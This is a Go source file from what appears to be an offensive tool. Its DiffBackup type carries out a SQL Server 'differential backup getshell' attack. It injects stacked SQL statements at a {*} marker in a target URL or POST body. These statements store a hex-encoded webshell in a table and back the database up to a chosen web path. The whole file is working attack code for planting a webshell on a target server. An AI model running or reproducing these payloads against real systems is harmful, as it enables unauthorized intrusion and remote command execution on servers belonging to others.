package utils

import (
	"fmt"
	"strings"
)

type DiffBackup struct {
	baseUrl  string
	method   string
	proxyUrl string
	headers  []string
	webshell string
	postData string
	timeout  int
	combine  bool
}

func (bl *DiffBackup) Init(baseUrl string, method string, proxyUrl string, headers []string, webshell string, postData string, timeout int, combine bool) {
	bl.baseUrl = baseUrl
	bl.method = method
	bl.proxyUrl = proxyUrl
	if method != "POST" && method != "GET" {
		panic("method must be POST or GET")
	}
	//for _, header := range headers {
	//	kv := strings.Split(header, ":")
	//	if len(kv) != 2 {
	//		continue
	//	}
	//	bl.headers.Add(kv[0], kv[1])
	//}
	bl.headers = headers
	bl.webshell = webshell
	bl.postData = postData
	if timeout == 0 {
		bl.timeout = 30
	}
	bl.combine = combine
}

func (bl *DiffBackup) Getshell(dbname string, backupdir string) {
	tempStr := generateRandomString(5)
	payload_stage0 := payloadEncode(fmt.Sprintf(";alter database [%s] set recovery simple--", dbname))
	payload_stage1 := payloadEncode(fmt.Sprintf(";backup database [%s] to disk='%s'--", dbname, tempStr))
	payload_DropTable := payloadEncode(fmt.Sprintf(";drop table [%s]--", tempStr))
	payload_stage2 := payloadEncode(fmt.Sprintf(";create table [%s] ([cmd] [image])--", tempStr))
	payload_stage3 := payloadEncode(fmt.Sprintf(";insert into [%s] ([cmd]) values(%s)--", tempStr, fmt.Sprintf("0x%x", bl.webshell)))
	payload_stage4 := payloadEncode(fmt.Sprintf(";backup database [%s] to disk='%s' WITH DIFFERENTIAL,FORMAT--", dbname, backupdir))
	payload_combine := payloadEncode(";alter database [" + dbname + "] set recovery simple;backup database [" + dbname + "] to disk='" + tempStr + "';drop table [" + tempStr + "];create table [" + tempStr + "] ([cmd] [image]);insert into [" + tempStr + "] ([cmd]) values(" + fmt.Sprintf("0x%x", bl.webshell) + " );backup database [" + dbname + "] to disk='" + backupdir + "' WITH DIFFERENTIAL,FORMAT;drop table [" + tempStr + "]--")
	if bl.combine {
		switch bl.method {
		case "POST":
			if bl.postData == "" {
				panic("postData cannot be empty while using POST method.")
			}
			if !strings.Contains(bl.postData, "{*}") && !strings.Contains(bl.baseUrl, "{*}") {
				panic("postData or baseUrl should contain a {*} mark.")
			}
			println("sending payload.")
			bl.post(payload_combine)
			break
		case "GET":
			if !strings.Contains(bl.baseUrl, "{*}") {
				panic("baseUrl should contain a {*} mark.")
			}
			println("sending payload.")
			bl.get(payload_combine)
			break
		}
	} else {
		switch bl.method {
		case "POST":
			if bl.postData == "" {
				panic("postData cannot be empty while using POST method.")
			}
			if !strings.Contains(bl.postData, "{*}") && !strings.Contains(bl.baseUrl, "{*}") {
				panic("postData or baseUrl should contain a {*} mark.")
			}
			println("sending payload.")
			bl.post(payload_stage0)
			bl.post(payload_stage1)
			bl.post(payload_DropTable)
			bl.post(payload_stage2)
			bl.post(payload_stage3)
			bl.post(payload_stage4)
			bl.post(payload_DropTable)
			break
		case "GET":
			if !strings.Contains(bl.baseUrl, "{*}") {
				panic("baseUrl should contain a {*} mark.")
			}
			println("sending payload.")
			bl.get(payload_stage0)
			bl.get(payload_stage1)
			bl.get(payload_DropTable)
			bl.get(payload_stage2)
			bl.get(payload_stage3)
			bl.get(payload_stage4)
			bl.get(payload_DropTable)
			break
		}
	}

}

func (bl *DiffBackup) post(payload string) {
	HttpPost(
		strings.Replace(bl.baseUrl, "{*}", payload, -1),
		strings.Replace(bl.postData, "{*}", payload, -1),
		bl.headers,
		bl.proxyUrl,
		bl.timeout,
	)
}

func (bl *DiffBackup) get(payload string) {
	HttpGet(
		strings.Replace(bl.baseUrl, "{*}", payload, -1),
		bl.headers,
		bl.proxyUrl,
		bl.timeout,
	)
}
